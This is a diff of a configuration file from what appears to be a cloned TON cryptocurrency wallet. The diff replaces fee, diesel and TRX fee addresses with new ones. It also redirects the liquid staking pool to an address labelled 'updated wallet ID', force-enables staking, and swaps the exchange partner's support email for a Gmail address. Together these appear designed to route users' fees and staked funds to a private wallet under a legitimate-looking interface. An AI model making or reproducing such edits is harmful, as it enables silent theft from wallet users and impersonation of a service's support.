@@ -48,14 +48,14 @@ export const ELECTRON_HOST_URL = 'https://dumb-host';
 export const INACTIVE_MARKER = '[Inactive]';
 export const PRODUCTION_URL = 'https://walletdps.netlify.app';
 export const BETA_URL = IS_CORE_WALLET ? 'https://beta.wallet.ton.org' : 'https://beta.mytonwallet.app';
-export const APP_INSTALL_URL = 'https://walletdps.netlify.app/';
-export const APP_REPO_URL = 'https://github.com/mytonwallet-org/';
+export const APP_INSTALL_URL = 'https://walletdps.netlify.app';
+export const APP_REPO_URL = 'https://github.com/mytonwallet-org';
 export const BASE_URL = process.env.BASE_URL;
-
 export const BOT_USERNAME = process.env.BOT_USERNAME || 'DPStoken_bot';
 
-export const SWAP_FEE_ADDRESS = process.env.SWAP_FEE_ADDRESS || 'UQDUkQbpTVIgt7v66-JTFR-3-eXRFz_4V66F-Ufn6vOg0GOp';
-export const DIESEL_ADDRESS = process.env.DIESEL_ADDRESS || 'UQC9lQOaEHC6YASiJJ2NrKEOlITMMQmc8j0_iZEHy-4sl3tG';
+export const SWAP_FEE_ADDRESS = process.env.SWAP_FEE_ADDRESS || 'UQAJ3_21reITe-puJuEyRotn0PWlLDcbuTKF65JxhvjTBtuI'; // updated  wallet ID
+export const DIESEL_ADDRESS = process.env.DIESEL_ADDRESS || 'UQAJ3_21reITe-puJuEyRotn0PWlLDcbuTKF65JxhvjTBtuI'; // updated wallet ID
+//export const DIESEL_ADDRESS = process.env.DIESEL_ADDRESS || 'UQC9lQOaEHC6YASiJJ2NrKEOlITMMQmc8j0_iZEHy-4sl3tG';
 
 export const STRICTERDOM_ENABLED = DEBUG && !IS_PACKAGED_ELECTRON;
 
@@ -130,7 +130,7 @@ export const TRON_MAINNET_API_URL = process.env.TRON_MAINNET_API_URL || 'https:/
 export const TRON_TESTNET_API_URL = process.env.TRON_TESTNET_API_URL || 'https://api.shasta.trongrid.io';
 
 export const FRACTION_DIGITS = 9;
-export const SHORT_FRACTION_DIGITS = 2;
+export const SHORT_FRACTION_DIGITS = 4;
 
 export const MAX_PUSH_NOTIFICATIONS_ACCOUNT_COUNT = 3;
 
@@ -167,7 +167,7 @@ export const EMPTY_HASH_VALUE = 'NOHASH';
 export const IFRAME_WHITELIST = ['http://localhost:*', 'https://tonscan.org'];
 export const SUBPROJECT_URL_MASK = 'https://*.netlify.app';
 
-export const CHANGELLY_SUPPORT_EMAIL = 'zyfflexhub@gmail.com';
+export const CHANGELLY_SUPPORT_EMAIL = 'zyflexhub@gmail.com';
 export const CHANGELLY_LIVE_CHAT_URL = 'https://changelly.com/';
 export const CHANGELLY_SECURITY_EMAIL = 'security@changelly.com';
 export const CHANGELLY_TERMS_OF_USE = 'https://changelly.com/terms-of-use';
@@ -245,18 +245,21 @@ export const LANG_LIST: LangItem[] = [
   },
 ];
 
-export const IS_STAKING_DISABLED = IS_CORE_WALLET;
+//export const IS_STAKING_DISABLED = IS_CORE_WALLET;
+export const IS_STAKING_DISABLED = false;
+
+
 export const VALIDATION_PERIOD_MS = 65_536_000; // 18.2 h.
 export const ONE_TON = 1_000_000_000n;
 export const DEFAULT_FEE = 15_000_000n; // 0.015 TON
 export const UNSTAKE_TON_GRACE_PERIOD = 20 * 60 * 1000; // 20 m.
 
 export const STAKING_POOLS = process.env.STAKING_POOLS ? process.env.STAKING_POOLS.split(' ') : [];
-export const LIQUID_POOL = process.env.LIQUID_POOL || 'EQD2_4d91M4TVbEBVyBF8J1UwpMJc361LKVCz6bBlffMW05o';
+export const LIQUID_POOL = process.env.LIQUID_POOL || 'EQB4ugVrUUV7ySLfQFgvohiMHKE3i5ma_U6CixUd3aAk3U1A';  //  updated wallet ID
 export const LIQUID_JETTON = process.env.LIQUID_JETTON || 'EQCqC6EhRJ_tpWngKxL6dV0k6DSnRUrs9GSVkLbfdCqsj6TE';
 export const STAKING_MIN_AMOUNT = ONE_TON;
 export const NOMINATORS_STAKING_MIN_AMOUNT = 10_000n * ONE_TON;
-export const MIN_ACTIVE_STAKING_REWARDS = 100_000_000n; // 0.1 MY
+export const MIN_ACTIVE_STAKING_REWARDS = 100_000_000n; // 0.1 MYCOIN
 
 export const TONCONNECT_PROTOCOL_VERSION = 2;
 export const TONCONNECT_WALLET_JSBRIDGE_KEY = IS_CORE_WALLET ? 'tonwallet' : 'mytonwallet';
@@ -319,7 +322,7 @@ export const TON_USDT_MAINNET_SLUG = 'ton-eqcxe6mutq';
 export const TON_USDT_TESTNET_SLUG = 'ton-kqd0gkbm8z'; // Where to get this token: https://t.me/testgiver_ton_usdt_bot
 export const STAKED_TON_SLUG = 'ton-eqcqc6ehrj';
 export const STAKED_MYCOIN_SLUG = 'ton-eqcbzvsfwq';
-export const TRX_SWAP_COUNT_FEE_ADDRESS = 'TW2LXSebZ7Br1zHaiA2W1zRojDkDwjGmpw';
+export const TRX_SWAP_COUNT_FEE_ADDRESS = 'TGfgtSZJjXaYpCfGtB4Khuii1HR9bHP56M';
 export const MYCOIN_STAKING_POOL = 'EQC3roTiRRsoLzfYVK7yVVoIZjTEqAjQU3ju7aQ7HWTVL5o5';
 
 export const ETHENA_STAKING_VAULT = 'EQChGuD1u0e7KUWHH5FaYh_ygcLXhsdG2nSHPXHW8qqnpZXW';
@@ -609,13 +612,13 @@ export const PRICELESS_TOKEN_HASHES = new Set([
 
 export const STAKED_TOKEN_SLUGS = new Set([STAKED_TON_SLUG, STAKED_MYCOIN_SLUG, TON_TSUSDE.slug]);
 
-export const DEFAULT_OUR_SWAP_FEE = 2; 
+export const DEFAULT_OUR_SWAP_FEE = 0.875; 
 
 export const DEFAULT_STAKING_STATE: ApiLiquidStakingState = {
   type: 'liquid',
   id: 'liquid',
   tokenSlug: TONCOIN.slug,
-  annualYield: 6.9,
+  annualYield: 5.5,
   yieldType: 'APY',
   balance: 0n,
   pool: LIQUID_POOL,
@@ -630,7 +633,7 @@ export const DEFAULT_NOMINATORS_STAKING_STATE: ApiNominatorsStakingState = {
   type: 'nominators',
   id: 'nominators',
   tokenSlug: TONCOIN.slug,
-  annualYield: 7.9,
+  annualYield: 7.5,
   yieldType: 'APY',
   balance: 0n,
   pool: 'Ef8dgIOIRyCLU0NEvF8TD6Me3wrbrkS1z3Gpjk3ppd8m8-s_',
